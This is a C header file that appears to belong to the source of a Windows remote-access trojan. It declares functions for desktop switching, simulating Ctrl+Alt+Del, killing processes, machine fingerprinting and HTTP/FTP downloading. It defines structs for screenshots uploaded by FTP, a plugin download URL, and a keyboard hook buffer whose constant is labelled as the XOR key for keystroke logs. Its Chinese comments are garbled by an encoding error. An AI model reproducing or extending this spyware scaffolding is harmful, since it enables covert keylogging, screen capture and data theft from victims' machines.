#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED
#include "RegEditEx.h"

#define ENCODEKEY 11

#ifndef SAFE_DELETE
#define SAFE_DELETE(p) {if (NULL != p) {delete p; p = NULL;}}
#endif

#ifndef SAFE_DELARRAY
#define SAFE_DELARRAY(p) {if (NULL != p) {delete[] p; p = NULL;}}
#endif

#ifndef ARRAY_LENGTH
#define ARRAY_LENGTH(a)	(sizeof(a)/sizeof(a[0]))
#endif

#ifndef SAFE_CLOSEHANDLE
#define SAFE_CLOSEHANDLE(p) {if (INVALID_HANDLE_VALUE != p) {CloseHandle(p); p = INVALID_HANDLE_VALUE;}}
#endif

typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	BOOL	bInteractive; // �Ƿ�֧�ֽ�������
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;

unsigned int __stdcall ThreadLoader(LPVOID param);

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
  LPDWORD lpThreadId, BOOL bInteractive = FALSE);
	
DWORD GetProcessID(LPCTSTR lpProcessName);
void KillProcess(LPCTSTR lpProcessName);
char *GetLogUserXP();
char *GetLogUser2K();
char *GetCurrentLoginUser();

BOOL SwitchInputDesktop();

BOOL SelectHDESK(HDESK new_desktop);
BOOL SelectDesktop(char *name);
BOOL SimulateCtrlAltDel();
BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName);
BOOL FtpDownLoad(TCHAR *szUrl,LPCTSTR szFileName,TCHAR *szPlugName,TCHAR *szUser,TCHAR *szPass);  
void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key);//����
BOOL GetCPUID(LPSTR lpOutStr);
LPSTR GetFirstMac(LPSTR lpAddrMac);
LPSTR GetTSPMachineID(LPSTR lpOutStr);		//ȡTSP�Ļ�����ʶ��
BOOL GetRegValue(HKEY hMainKey, LPCTSTR szSubKey, LPCTSTR szItem, LPTSTR szValue);

DWORD MyGetFileSize(TCHAR *szFileName);
BOOL StartAutoSreen(LPVOID lparam,TCHAR *szIP,DWORD dwFlag);
void StopAutoScreen();
LPVOID GetShareMem(LPCTSTR lpName);
BOOL GetScreenState();
BOOL GetParentProcessPath(TCHAR *szSelfName,OUT CHAR *szFilePath,BOOL IsTerminate);
void ASCIIToUnicode(char* ASCIIString,wchar_t* WideChar);
int CompressFile(TCHAR *lpSrcFileName, TCHAR*lpDesFileName);

typedef struct FTPCONFIG
{
	TCHAR szUpIP[20];        //�ϴ�FTP��������IP
	WORD dwFtpProt;          //�ϴ�FTP�Ķ˿�
	TCHAR szUserName[20];    //�ϴ�FTP�û���
	TCHAR szPass[20];        //�ϴ�FTP����
	TCHAR szRemotoDir[0x50];   //�ϴ���FTP��ʲô�ļ���
	int m_nScrTimeInternal;	 //����ʱ����
	int m_nScrBitCount;		 //����λ��

}FTPCONFIG,*pFTPCONFIG;

typedef struct AUTOSREECNCONFIG
{
	FTPCONFIG FtpConfig;
	//DWORD dwFTP
	TCHAR szFtpUser[20];//����FTP���û��� 
	TCHAR szFtppass[20];//����FTP������
	TCHAR szPlugName[50];//�����
	TCHAR szDownLoadPlugUrl[50];//���������Url

}AUTOSREECNCONFIG,*pAUTOSREECNCONFIG;

typedef struct 
{
	int nTimeInternal;	//����ʱ����
	int nBitCount;		//����λ��
}INFOSCREEN, *PINFOSCREEN;


typedef struct
{
	DWORD dwType;
	int nCount;
	int nAvalible; 
	int nCapacity;
	//��չ���ԣ���ʱ��

	AUTOSREECNCONFIG infoScreen;
	int nTypeAlarmSrn;
	//	TCHAR szCmdLine[1]; //������
}INFOSTATE, *PINFOSTATE;


#define	SIZE_IMM_BUFFER					128
#define XOR_ENCODE_VALUE				98	// ���̼�¼���ܵ�xorֵ

typedef	struct
{
	//DWORD   g_bSignalHook;
	DWORD	dwOffset;
	HHOOK	hGetMsgHook;
	HWND	hActWnd;	//current actived window
	BOOL	bIsOffline;
	char	strRecordFile[MAX_PATH];
	char	chKeyBoard[1024];
	char	str[SIZE_IMM_BUFFER];
}TShared;


#endif // !defined(AFX_UNTIL_H_INCLUDED)